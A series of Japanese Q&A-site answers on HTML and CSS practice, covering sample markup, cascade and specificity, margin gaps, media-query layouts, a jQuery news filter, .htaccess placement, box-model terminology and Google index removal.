No.4です。 　実際の例を見るのが最も分かりやすいでしょう。いつも、こういう時に使っている簡単なサンプルをあげておきます。 ★タブは＿に置換してあるので戻す。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ★Another HTML-lint 5( http://www.htmllint.net/ ) 　のDATA入力(右上)でチェック済み ★外部に持ちだせば、同じ文書構造のHTMLには一つのスタイルシートだけでHTMLを一切触らずにデザインを変更できます。 　[例] 　ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　でchrome以外のブラウザで[表示メニュー]→[スタイル)シート)]で、スタイルシートを変えるだけでデザインが変えられることが実感できるでしょう。 ★プロパティはすでに御存知ですから、カスケーディングの仕組みを身につければよいです。CSSと言うくらいカスケーディングはCSSの肝です。実はコレを知らずにスタイルシートを使うのは早すぎる・・と言われるくらい。 　その意味でもHTMLのstyle属性での指定はまずいのです。詳細度が[1,0,0,0]になりますから、外部スタイルシートではデザインを変更できません。 【サンプルの見方】 /* ここから、ひとつの宣言ずつ追加してみる。(行頭の/* をひとつずつ消していく */ 以降の/* を一行ずつ消していく。 　先に紹介した仕様書と照らし合わせながら・・ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* 分かりやすいように着色 */ body{background-color:gray;} div.header{background-color:yellow;} div.section{background-color:white;} div.aside{background-color:lime;} div.nav{background-color:aqua;} div.footer{background-color:fuchsia;} /* ここから、ひとつの宣言ずつ追加してみる。(行頭の/* をひとつずつ消していく */ html,body{ /* margin:0; /* padding:0; } p{ /* margin:0; /* line-height:1.6em; /* text-indent:1em; } div.header,div.section,div.footer{ /* width:80%;min-width:640px; /* padding:5px 10px; /* margin:0 auto; /* position:relative; } div.section div.nav, div.section div.aside{ /* font-size:0.9em; /* width:180px; /* padding:5px; /* position:absolute; /* top:0; /* height:100%; } div.section h2,div.section p,div.section ul{ /* margin:0 200px; } div.section div.nav{ /* left:0; } div.section div.aside{ /* right:0; } div.section div.nav p, div.section div.aside p{ /* margin:0; } div.section p:first-letter{ /* font-weight:bold; /* font-size:1.5em; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>ここに本文記事を書く</p> ＿＿<p>HTMLには、デザインに関することは書かず文書構造だけ書くようにすると、後々のメンテナンスも楽になります。ほかじゃない、一番助かるのは自分ですね。</p> ＿＿<p>HTML5の場合は、これらのclass名がそのまま要素になります。</p> ＿＿<ul> ＿＿＿<li>&lt;div class="header"&gt;～&lt;/div&gt;<br>⇒&lt;header&gt;～&lt;/header&gt;</li> ＿＿＿<li>&lt;div class="section"&gt;～&lt;/div&gt;<br>⇒&lt;section&gt;～&lt;/section&gt;</li> ＿＿＿<li>&lt;div class="aside"&gt;～&lt;/div&gt;<br>⇒&lt;aside&gt;～&lt;/aside&gt;</li> ＿＿＿<li>&lt;div class="nav"&gt;～&lt;/div&gt;<br>⇒&lt;nav&gt;～&lt;/nav&gt;</li> ＿＿＿<li>&lt;div class="footer"&gt;～&lt;/div&gt;<br>⇒&lt;footer&gt;～&lt;/footer&gt;</li> ＿＿</ul> ＿＿<div class="aside"> ＿＿＿<h3>本文とは直接関係しないasideな記事</h3> ＿＿＿<p>ここには参考サイトなど直接本文と関係ないが、あると良い情報など。</p> ＿＿</div> ＿＿<div class="nav" id="siteMap"> ＿＿＿<h3>ナビゲーション</h3> ＿＿＿<ol> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="/products">Products</a></li> ＿＿＿＿<li><a href="/manual">Manual</a></li> ＿＿＿＿<li><a href="/profile">Profile</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2013-08-02 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
＞これで表示したときに上下の線と内容の間に隙間があいてしまいます 　どの線のことか迷ったのですが、#frameとh2共にボーダーが指定してあるので、このボーダー間の隙間ですね。 　h1,h2,・・p,ul,ol,dlなどのブロック要素は、 「一般に、ブロックレベル要素は新しい行を開始し、行内要素は新しい行を開始しない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」と書かれているように、すこし隙間を空けて(行の折り返しによる行間--line-height--)と区別するためにmarginがあります。 　この場合、h2要素のmarginのために、隙間が開くのでしょう。 ★firefoxの開発者ツール( 開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … ) )に Firebug( https://addons.mozilla.jp/firefox/details/1843 )というアドオンがあります。コレを使うと、隙間がどちらに由来するか直ちに分かります。 #frame { border:solid 1px black; width: 200px; padding:0; } #frame h2{ background-image: url("ex05_titlebg.png") no-repeat; border: #808080 2px solid; padding: 0 7px; margin:0; line-height:20px;/* 背景の高さが20pxなら */ } #frame ul,#frame ul li{ margin:0;padding:0; list-style:none;display:block; text-align:center; line-height:20px; } #frame ul li{width:20em;} #frame ul li a{text-decoration: none;} ★ul,ol,liにも同様にmarginまたはpaddingやmarginで字下げや上下の間隔が取られています。ブラウザによってmarginだったりpaddingだったりします。marginやpaddingを0にして、line-heightで上下中央に、text-alignで左右中央に合わせると良いでしょう。 ★id=frameではなく、文書構造を示すclass名をつけるほうが良いです。 例えば、<div class="nav">とか・・ 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　細かいことのようですが、先で枠内ではなく横に並べようとか、デザインを根本的に変えたいとき不整合になりますし、将来、あるいは他人がHTMLを修正/メンテナンスする時に、そこに何が書かれているか分かりにくくなります。 　HTML5では、HTML4.01で<div class="nav">のように書かれていたものは<nav>になります。
「レース結果」のページを見ましたが、データをPOSTで渡していましたのでURLを貼り付けるだけでは「見られません」
提示されているサイトの仕組みは，サーバーサイドのプログラムが302 Foundでリダイレクトさせるものです。 このため，そのままのものをクライアントサイドのみで作ることはできません。 検索文字列の与え方がすべてのサイトで同じであれば， HTML5のformaction属性およびformmethod属性を指定する，という方法が採れるのですが， 今回の場合，検索文字列の与え方がサイトごとに異なるため，この方法も採れません。 つまりは純粋にHTMLのみでは不可能です。 なお，検索文字列の与え方が違う，というのは， ・Yahoo! Japanでは http://search.yahoo.co.jp/search?ei=UTF-8&fr=sls … とpに検索文字列を与える ・Amazon.co.jpでは http://www.amazon.co.jp/s/?creative=7995&campaig … と，field-keywordsに検索文字列を与える ・Twitterでは https://twitter.com/search?q=HTML5 と，qに検索文字列を与える のように，name属性値が異なっていることを意味しています。 純粋にHTMLのみではないですが，アイコンボタンのクリックイベントで， 対象のサイト用にフォーム情報を作り直して送信するようなJavaScriptを書けば， サーバーサイドのプログラム無しで動くと思います。
「△△△」というサイトを作ろうとすると、「△△△サイトのルートフォルダーと同じですよ」と教えられる。 要するに、「△△△」というサイトの管理をすでに設定していますよ、という意味です。 > 「選択したルートフォルダーは○○○サイトのフォルダーと同じです。これにより、 > 同期などの操作が正しく行われなくなる可能性があります。続行しますか？」 これは、選択したルートフォルダーが、別のサイト管理でルートに指定しているフォルダーと同じですよ。 というアラートです。 本来は「別のサイトなのにローカルでは同じフォルダだけどいいんですか？」という注意です。 今回に関しては○○○という部分が△△△と同じなので、「そのサイトの管理もうしてますよ」と意訳できるわけです。 ただ、全く同一のサイト名はその前にエラーが出て登録できないはずなので、 「△△▲」みたいな、同じようで別の名前だと予想します。 半角と全角の違いとか。 もし、まだそのサイト管理をしてなかったらバグでしょう。 別サイトで同じルートフォルダを指定しても、問題という問題はありません。 （する必要もないと思いますが）
再帰エラーは、スタイル・シートをそれ自体に添付しようとしたために発生します。HTML ドキュメントが「ドキュメント」ウィンドウで開かれていることを確認の上、スタイル・シートを添付する前に、ドキュメントの中でクリックし、フォーカスを与えてください。
「一括できりかえたい」 が、なにを持ってそれをしたいかで決めるのでは? (1)．TRタグにclassを設定して切り替える。 　意味不明です。class名(やid)は、文書構造を補完するためですよ。 　特定のclass名を持つtr要素の表示非表示を切り替えたいと考えます。似てるし結果も同じだが、まるで違う。 h2+table tr+tr{display:none;} h2+table tr+tr+tr{display:table-row;} h2:hover+table tr+tr{display:table-row;} table:hover tr+tr{display:table-row;} で、見出し<h2></h2>に続くtableの 　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 2行目は隠れているが、h2やtableにマウスオーバーすると2行目が表示されます。
　スクロールバーは内容がはみ出ない限り表示されませんし、スクロールバーはブロックの内側に現れますから、firefoxの解釈が正しいのですが、それを回避する為にはブレークポイントのサイズを655pxとか660pxにするのが簡単です。 　パソコンなどのディスプレイでその幅で見ることはありませんので。 　なお当然ですが、いずれもリキッドデザインが原則です。パソコンなどの小さなディスプレイでmediaqueryが無効であっても、リキッドで追随していくが、限界を越すと(mediaqueryに対応した端末では)デザインを切り替えると考えます。 　例えば、ブレークポイントまでは、３カラムの配置でウィンドウ幅に合わせて伸縮しますが、それを越えて小さくなると２カラムに変化する。(もちろん携帯電話などでは、１カラムですが) HTML5として <header></header><!-- HTML4なら <div class="header"> --> <section><!-- HTML4なら <div class="section"> --> 　本文 　<nav>ナビ</nav> 　<aside>補足</aside> <section> <footer></footer> だとして パソコン ┌──────┐ │ＨＥＡＤＥＲ│ ├─┬──┬─┤ │Ｎ│本文│補│ │Ａ│本文│足│ ├─┴──┴─┤ │ＦＯＯＴＥＲ│ └──────┘ スマホ↓ ┌───┐ │HEADER│ ├─┬─┤ │Ｎ│本│ │Ａ│文│ ├─┴─┤ │補足？│ ├───┤ │FOOTER│ └───┘ のように切り替えると良いでしょう。
仕様書を見て分からなければ、はじめてこういう場所で聞くという癖つけないとダメですよ。 ここで得られる情報なんて、限定的で、時には間違った情報も 　⇒17 フォーム( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 1. INPUT要素 　　INPUT要素で作成するコントロールの形式 　　INPUT要素のコントロールを含むフォームの例 2.BUTTON要素 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから BUTTON要素が生成するボタンとINPUT要素が生成するボタンは、機能的には同等だが、 BUTTON要素の方がレンダリング能力が高い。 BUTTON要素は内容を持てる。例えば、画像を内容に持つBUTTON要素の機能は、type属性が"image"のINPUT要素とそっくり同じだが、BUTTON要素型は内容を持てるのだ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より
metaタグはbodyにいれてもブラウザ側で無視される仕様になっていますので、入れても無駄になるだけです。 またSEOの観点からは、誤っているHTMLと解釈されマイナス要素のひとつになります。 画面周りを変更されたいのでしたら、body部にjavaScriptにて記述して制御すればよいのではないでしょうか。
縦に並べたいならfloatいらないじゃん（笑） タグやプロパティはちゃんと意味を把握して使いましょうね。
＞<TBODY> ＞<TR> ＞<TD valign="top" width="969" align="left" height="625"><IMG src="image2.gif" width="974" height="145" border="0"><BR> 　の意味理解されてますか？ 　src="image2.gif"は、そのHTMLと同じフォルダー(階層)にあるimage2.gifと言う意味です。 　そのHTMLを直接開いて表示される画像を右クリックして画像だけを表示させれば、HTMLと同じパスで最後が、index.htmlからimage2.gifに変わるはずです。 ★いまどき、tableで配置することはありません。たぶんビルダーの悪名高き「どこでも配置モード」で製作されたページだと思われます。 　この機会に全面的な書き換えをされたほうが良いでしょう。 　
＞せっかく説明していただいたjavascriptのことも分かりません。 　理解しようとしない限り永遠に分かりません。 　googleは、javascriptを使用しなくてもクロールできるようHTMLを書けといっているのです。 『JavaScript、・・・【中略】・・・などの特殊な機能が使用されているために・・・【中略】・・・検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。』 　分かりませんか？？？？ 　私のサンプルは、問題のあるjavascritを使っていません。 　単純にHTML+CSSですから、そのままコピーペーストして、＿をタブに、http：をhttp:に置換すれば、IE7以上なら、どのブラウザでも動作するはずです。
iframeは、外部のHTMLを呼び出すので、呼び出し元のHTMLやスタイルシートでは指定できません。 　なお、外部HTMLとは、そのHTMLが呼び出しているスタイルシートや画像も含みます。 ＞cssも使ったhtmlです。 検索してemを使えば指定文字数で改行できることが分かりましたのでそれを踏まえて試行してみました。 　意味が全く不明です。CSS,HTMLは頭文字ですから大文字です。emは要素の場合はEMと書いたほうが分かりやすいでしょう。スタイルシートの値であるemと区別がつきません。 ★そもそもHTMLの要素であるEMは、行内要素(inline)です。 　⇒9.2.1 フレーズ要素: EM、 STRONG、DFN、CODE、SAMP、 KBD、VAR、CITE、ABBR、及び ACRONYM要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　スタイルシートで指定しなければ、ブラウザの持つデフォルトのスタイルシートで斜体や下線付きで表示されますが、意味的には単に「強調」であって、その意味がないのに遣うべきではありません。 ★スタイルシートのサイズのemは、その時点でのフォントサイズを参照する相対サイズです。 　⇒4.3.2 長さ（Lengths）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　いずれであるにしろ、改行には一切無関係です。 　改行の処理は言語体系によって異なります。単語境界を持つ英文などでは、必ず半角スペースで改行されますが、日本語のように単語境界を持たない言語では、改行位置は、そのブロックのサイズいっぱいで、どの場所でも改行されます。 ＞emを使えば指定文字数で改行できることが 　は、誤りです。 　されたいことが、さっぱり分からないまですが、英文のように特定の単語内で改行したくないときは、 <div class="section poem" lang="ja"> <h2>山のあなた</h2> <p class="poet">カール・ブッセ</p> <p class="translator">上田敏</p> <p><span class="word">山の</span><span class="word">あなたの</span><span class="word">空遠く</span></p> <p><span class="word">「幸さいはひ」</span><span class="word">住むと</span><span class="word">人のいふ。</span></p> <p><span class="word">噫ああ、</span><span class="word">われひとと</span><span class="word">尋とめゆきて、</span></p> <p><span class="word">涙さしぐみ、</span><span class="word">かへりきぬ。</span></p> <p><span class="word">山のあなたに</span><span class="word">なほ遠く</span></p> <p><span class="word">「幸さいはひ」</span><span class="word">住むと</span><span class="word">人のいふ。</span></p> </div> <div class="section poem" lang="de"> <h2>Über den Bergen</h2> <p class="poet">Karl Busse</p> <p>Über den Bergen weit zu wandern</p> <p>Sagen die Leute, wohnt das Glück.</p> <p>Ach, und ich ging im Schwarme der andern,</p> <p>kam mit verweinten Augen zurück.</p> <p>Über den Bergen weti weti drüben,</p> <p>Sagen die Leute, wohnt das Glück.</p> </div> div.poem{width:30%;margin:0 auto;background-color:silver;padding:10px;} div.poem p.poet,div.poem p.translator{text-align:right;} div.poem p{margin:0.5em 0;line-height:1.5em;} div.poem span.word{white-space:pre;}
なぜCSSじゃダメなのか知りませんが（まさか「覚える気が無いから」とは言わないよね（笑））、どうしてもHTMLのみでやりたいなら<table>使うしかないでしょうね。 いまどきテーブルレイアウトなんて唾棄と嘲笑の的ですけど。
基本的な確認事項が抜けているようですが、実施されましたかね？ 実際に自社やご自宅のアクセスから、普段使っているブラウザから　http://○○○.jp/robots.txt にアクセスが出来ますか？ アクセスが出来るのなら、何か文字化けをしているとか、目視にておかしな所は無いでしょうか？ アクセスが出来たのなら、UserAgentを変更出来るツールなどを使い、Googlebotを装って、もう一度アクセスしてみてください。 それでもアクセスが出来るのなら、アクセスログを見て、本当のGoogleBOTからrobots.txtにアクセスがあった記録を探してみましょう。 アクセスログに200なのか、他に503エラーが出ていないか、ログを確認して見ましょう。
torayoshiです。 iframe要素はその脆弱性の危険性から使えないWebサービスも多いので避けたほうが無難です。 いったんYouTubeにアップしてその動画のURLを取得し、 通販サイトのHTMLにobject要素で埋め込む方法を取ってみてはいかがでしょうか。 YouTube動画のURL取得方法は、 動画をアップし、そのページにアクセスすると、 アドレス欄にURLが表示されます。 例↓（適当です） 上記の例だと、 http://www.youtube.com/v/Bn9PaGb_YgbO が動画のURLになります。 埋め込みタグの例↓ <p> <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="（幅）" height="（高さ）" type="application/x-shockwave-flash"> <param name="movie" value="（動画URL）"/> <param name="wmode" value="transparent"/> <embed src="（動画URL）" width="（幅）" height="（高さ）" pluginspage="http://www.macromedia.com/go/getflashplayer" wmode="transparent" type="application/x-shockwave-flash" /> </object> </p>
スタイルシートです。 リセットしたらダメです。 ^^^^^^^^^^^^^^^^^^^^^^^^ 　せっかくブラウザがもつスタイルシートを利用できないばかりか、複雑怪奇になってメンテナンス不可能になってしまいます。 　必要なとき、必要な指定のみをしましょう。 あなたのスタイルシートの数分の一の量のはずです。 [abc.css] @charset "UTF-8"; div.header,div.section,div.footer{ ＿width:90%;max-width:960px;min-width:480px; ＿margin:0 auto; ＿position:relative; } h1,h2,h3,p{margin:0;line-height:1.6em;} div.header h1 img{display:block;width:100%;height:auto;} div.header div.nav ul,div.header div.nav ul li{ ＿list-style:none; ＿margin:0;padding:0; ＿text-align:center;line-height:2em; ＿font-size:0.85em; } div.header div.nav{ ＿width:auto; ＿border-radius: 5px 5px 0 0; ＿border-top: 6px solid #CC0033; ＿background-color:#CC0033; } div.header div.nav ul:after{ ＿display:block;content:"";white-space:pre;clear:left; ＿height:1px; } div.header div.nav ul li{display:block;float:left;width:8em;margin-left:2px;margin-bottom:2px;} div.header div.nav a{ ＿display:block;height:100%;width:100%; ＿background-image: url("http://sample1.digi2.jp/img/ul1.png"); } div.section,div.footer{margin-top:5px;} div.section h2{ ＿background:url(../img/hback.png);width:600px; ＿height:49px;text-align:center; ＿line-height:49px; } div.section table{ ＿border:6px solid #CCCCCC; ＿background-color:#CCCCCC; ＿border-radius: 10px; ＿box-shadow: 20px 10px 10px 1px #CCCCCC; ＿margin: 20px auto; ＿width: 90%; ＿border-collapse:separate; ＿cell-spacing:0; } div.section table tbody th,div.section table tbody td{ ＿background-color:white;padding:0.5em; ＿border:2px solid #CCCCCC;position:relative; } div.section table tbody th{ ＿background-image:url("../img/tableth.png"); ＿min-width:5em; } div.section table tbody td p{text-indent:1em;} div.section div.figure{ text-align:center; } div.section table tbody td div.figure img{ ＿padding:5px;border:1px gray solid; ＿max-width:90%; ＿height:auto; }
こんにちは。 イメージはこんな感じでしょうか。 (JavaScriptが動かない、または動かない設定にしている場合は動作しませんので本来ならサーバ上で処理するのが望ましいです) また、細かいことですが先頭が数字のIDは使えません。 <html lang="ja"> <head> <meta charset="utf-8"> <title>サンプル</title> <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jq … <style> div#news { display: none; } </style> <script> $().ready ( function() { // id="news"にdata.htmlを読み込む $('#news').load ( 'data.html', null, function() { // 表示する最大日数 var maxDate = new Date(new Date().getTime()+60*60*24*2*1000); // 取得したtdの分ループ処理 $(this).find('td').each ( function() { // idを取得する var id = $(this).attr('id'); // 取得したIDから日付文字列を取得 var date = id.split('-')[1]; // 日付文字列からミリ秒を生成 var targetDate = Date.parse(date.substring(0,4)+'/'+date.substring(4,6) + '/' + date.substring(6,8)); // 表示対象の日付であるかチェックし、対象外の場合は非表示とする if ( targetDate > maxDate.getTime() || targetDate < new Date().getTime()-60*60*1000*24 ) { $(this).css ( 'display', 'none' ); } }); // 表示する $('#news').show(); } ); }); </script> </head> <body> <h1>NEWS</h1> <div id="news"></div> </body> </html> ==== data.html <table border="0" width="560" cellpadding="2" cellspacing="0"> <tr> <td class="border" id="date-20130722-0"><a href="d.html" target="_blank">7/22 セミナー</a></td> </tr> <tr> <td class="border" id="date-20130721-0"><a href="d.html" target="_blank">7/21 セミナー</a></td> </tr> <tr> <td class="border" id="date-20130720-0"><a href="d.html" target="_blank">7/20 会議</a></td> </tr> <tr> <td class="border" id="date-20130719-1"><a href="e.html" target="_blank">7/19 機器入れ替え</a></td> </tr> <tr> <td class="border" id="date-20130719-0"><a href="f.html" target="_blank">7/19 会議</a></td> </tr> <tr> <td class="border" id="date-20130718-0"><a href="g.html" target="_blank">7/18 セミナー</a></td> </tr> <tr> <td class="border" id="date-20130717-0"><a href="g.html" target="_blank">7/17 セミナー</a></td> </tr> </table>
#1です。 > もし管理者に確認が取れた場合、理論的、アクセスカウンタを、借りることは可能でしょうか！？ 理論的には可能ですが、もし私がその管理者の場合は、お断りさせていただきます。 地域が違うということは、サーバーが別のものと思われます。 このカウンタは、CGIというサーバー側のリソースを利用して動作する仕組みになっています。 バグや脆弱性を付いた攻撃があった場合、相手方のサーバーに影響を与えることになります。 また、メンテナンスや休業日が違うことにより、突然見えなくなったりするやも知れません。 > <td><img src="http://www（自分HPアドレス） 自分のアドレス(URL)でカウンタが動いたのであれば、そのサーバーはカウンタの仕組みが実装済みです。 書籍や、Web検索などで、CGIについて調べてください。 どうしても、どうしても、アクセスカウンタの仕組みを学習したいのであれば、自分でサーバーを立ててみましょう。 もちろん、管理者の方や、上長には確認をとってください。 #2のかたが書かれた意見、同感です。 > アクセスカウンターごときより、先にしなければならないことのほうが多いです。
.htaccessを各ディレクトリに置く場合はありますよ。 例えば、 そのディレクトリ以下にしか指定を必要としない場合は、 わざわざルートから指定するのは無意味なので、 そのディレクトリにだけ設置すれば良いのだから・・・ どちらに負担が掛かるのかは、そのサイトのボリュームや重複設置の関係などによる。 また、ルートからの指定をそのディレクトリ以下から解除したい場合、 そのディレクトに解除のコードを書くと、 上書きして解除してくれるので、設置する場合はある。 ＞また、.htaccessはルートディレクトリではない、他のディレクトリにアップロードするような場合はあるのでしょうか？ Ａ、 つまり、YES
table[summary="schedule"]{ line-height:2em; } line-heightを加えておいたほうがよいかも。td,thにpaddingでも。
正しい用語が、正しく使われずに、別の意味として多く広まる事もあって、どちらも正しい用語になる場合もある。その矛盾を理解した上での質問でしょうか？・・・ 人によって解釈が違うのだから、どちらかを否定したり論議するのは意味の無い話になります。 ----------------------- ＞画像にあったボックスモデルの図について、『ボーダーで囲まれた四角』がボックスであり、破線で囲まれた四角はボックスでは ないですよね？ Ａ、 どちらにも解釈できるのでYesでもNoでもない。 ブロック要素の話なら「Yes!　ないです」と言えます。 ボックスを何処から見るかの視点での解釈の問題があって、 「ここにボックスを入れるので、その領域を確保して下さい」と指示されたとしたら、 貴方ならどうする？ 「そのボックスにマージンを含めるのか？」と、いちいち質問しますか？ 自分なら、マージンを含めた幅や高さの領域を確保するので、捉え方によってはマージンを含めた見たままの「破線で囲まれた四角はボックス」をボックスと判断します。 なので、 この場合のボックスとは、マージンを含める領域。 また、 ボーダーを含むか含まないかも問題で、DTDによって表示される大きさも違います。 ボーダーは、マージンの代わりにもなるしパディングの代わりにもなるからであって、ソースを見ないとボックスの領域は判断出来ず、 視覚的にはボックスやブロックの領域が判断出来ないという事。 なので、見える該当範囲全体を一概にボックスと言ってしまうケースが多い。 （他のボックスの影響もあるのにね・・・見えないのだからしょうがない・・・） 更に、 マージンやボーダーを含めるのか？の解釈に関しては、 CSS3からbox-sizingなるどちらにでもスイッチできるプロパティがあります。 なので、 box-size ＝ 「ボックスのサイズを決める規格」と解釈すると、 「ボックスはボーダーを含む事もできるし、別にする事もできる！」 と解釈できる。 しかし、 「marginは含んでいない」との解釈になります。 これは困った・・・ ボックスって何処から何処までの事やねん？・・・ とすると、どっちが正しいなんて事は言えませんね。矛盾。 ボックス ＝ 「該当の領域」 と云う大まかな枠として捉えれば良いのかも。 つまり、曖昧な用語なので決まりはない。 ブロック要素については、仕様によって明確な決まりがある。 なので、貴方が理解しているのは、ブロック要素と限定した話ですよね？ ------------ ボックスは、コンテンツの主領域があり、 　１、外包スペース＝マージン領域、 　２、罫線＝ボーダー領域、 　３、内包スペース＝パディング領域 がある。 ブロック要素は、主にコンテンツ領域があり、 　１、外包スペース＝マージン領域、 　２、罫線＝ボーダー領域、 　３、内包スペース＝パディング領域 を設定する事ができる。 と解釈した方が良いかもしれませんね。 つまり、 仕様書が何と言おうが、 世の中の多くの人が曖昧に利用するのだから、ボックスは実用的には定義のない言葉です。 仕様書の枠を超えた文章の問題であって、 人間が作って人間が利用しているのだから、コンピュータのように正か負かのような判定は出来ない。
１、＞グーグルの検索結果には表示され続けたと思います。 ２、＞htmlファイルを削除したら、すぐにグーグルの検索結果からも表示されないようにしたいのですが、 １・２では矛盾している？？ Googleのウェブマスターツールに登録してオーナー権限にて、削除依頼を行う。 https://support.google.com/webmasters/answer/166 … 貴方に依頼した仕事と同じで、何時やってくれるのか？・・・　誰にもわかなないし、取りこぼしもある。 ※削除依頼を行うという事で、今後のGoogleからの全体評価などに期待しない方が良いでしょう。 個人情報などは第三者からですら削除依頼ができるはずなので（未確認情報）オーナー権限なら、割と早く消えるはず。 https://support.google.com/webmasters/answer/164 … 商用の取り扱いが無くなった商品などの場合には、 リダイレクトで、なんらかのページに誘導してあげた方が商用向き。（折角の商機を失わない） リダイレクトする事で、検索結果も間接的に変更される。
なんと・・・ HTTPレスポンスソースを見ているわけではないのですね。。。 なんか私のほうが知識不足デスね・・・申し訳ない。 うーん、直接オブジェクトの中身見るってことで、ActiveXからJScriptで定義した関数呼び出す感じしか思い浮かばないス・・・。 イベント飛ばしてできた記憶がある程度なので、いろいろとアレですね・・・。 環境としてはIE9あたり？なのか・・・な？ 力になれず申し訳ないです。
環境はだいたい同じですね。 Ctrl+F5(F5のみは不可)でページを更新しても駄目であれば以下を試してみて下さい。 ・拡張機能をすべて無効 ・閲覧履歴データの削除
スタイルシートのみ書き換え(CSS3バージョン) #global-nav ul,#global-nav ul li{ margin: 0;padding: 0; list-style-type: none; } #global-nav ul{ width:80%; min-width:480px;max-width:800px;/* 480px～800px */ margin:0 auto; position:relative; } #global-nav ul li{ width:25%;height:38px; display: inline-block; } #global-nav li a{/* 詳細度 0 1 0 2 */ display:block; width:100%;height:100%; text-indent:-20em; background-image:url(images/home.jpg); background-size:100% 200%; overflow:hidden; } #global-nav li a:hover{/* 詳細度 0 1 1 2 */ background-position: 0 -38px; } #global-nav li a[href="aaaa.html"]{/* 詳細度 0 1 1 2 */ background-image:url(images/aaaa.jpg); } #global-nav li a[href="bbbb.html"]{ background-image:url(images/bbbb.jpg); } #global-nav li a[href="cccc.html"]{ background-image:url(images/cccc.jpg); } 　⇒セレクタ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　⇒値の割り当て、カスケード処理、継承( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) をよく読み、どうしてこのようなセレクタになるか理解すること。それによってHTMLもCSSも、とっても簡単に分かりやすくなります。
等幅フォントで見るから崩れない。
//　以下つづき 　　 　return function(n , id1, id2, speed){ 　/* Max number, id for drum, id for result, speed(1to10) */ 　　var obj = new drum(); 　　obj.max = n; 　　obj.drum = document.getElementById(id1); 　　obj.result = document.getElementById(id2); 　　obj.height = obj.drum.clientHeight; 　　obj.speed = Math.max(1, Math.min(10, speed)); 　　obj.reset(); 　　return obj; 　} })(); //************ テスト用 スクリプト var testDrum = DrumCreate(75, "drum", "result", 5); /* Max number, id for drum, id for result, speed(1to10) */ addEvent("reset", "click", function(){testDrum.reset();}); addEvent("switch", "click", function(){ 　if(testDrum.status) testDrum.stop(); else testDrum.roll(); }); /*@cc_on@*/ function addEvent(elm, eventname, func){ (typeof elm === "string"?document.getElementById(elm):elm)./*@if(1)attachEvent( 'on' + @else@*/addEventListener(/*@end@*/ eventname, func, false); } </script> </body> </html> …って、先ほど検索してみたら、ご提示のものとほぼ同じものがヒットしました。（サンプル不要でしたね） 　http://d.hatena.ne.jp/replication/20101125/12906 … 音の再生に関してはテストできる環境にないので、このあたりをご参考に。 （検索すればいろいろ見つかるはずです。） 　http://jabnz.blog69.fc2.com/blog-entry-546.html 　http://q.hatena.ne.jp/1179831319 　http://webos-goodies.jp/archives/50855398.html
HTMLでは、名前空間という考え方はしないです。 　HTML5をPolyglot マークアップ・・・XML互換の仕様で記述する時にはじめて名前空間と言う概念が必要になります。 　⇒Polyglot マークアップ: HTML 互換の XHTML 文書/5. 名前空間( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　HTML4.01以前は、DOCTYPEを用いて、それぞれの要素が何に含まれ、何を含まれうるかを指定していましたが、XMLに合わせたXHTMLでは名前空間を使用して定義されるようになりました。XHTMLはXMLですから、独自に名前空間を指定してタグ(要素を拡張することも出来ました) 　しかし、HTML5では、DOMを使用します。 　
スキルはまったくありませんけれど… ＞ソースを見るとaタグのtitleをブラウザ上に表示させていました。 ご質問のような操作も可能だとは思いますが、ソースをご覧になったのであればわかると思いますが、下に表示されているキャプションは 　<div class="topnewstitle">プカプカ浮かぶカバのシルエットが可愛い雑貨シリーズ　[erath +d]</div></a> のようにソース内にそれぞれHTMLでマークアップされています。 それなので、別に特殊なことをやっているわけではなく、ソースがそのまま表示されているだけだと思いますが… まぁ、このソース自体がサーバ側のプログラムから出力されている可能性が高いと思いますので、そちらで、キャプション部分のdiv要素をリンクタグのtitleと同じ文字列にして作成しているのではないかと推測します。
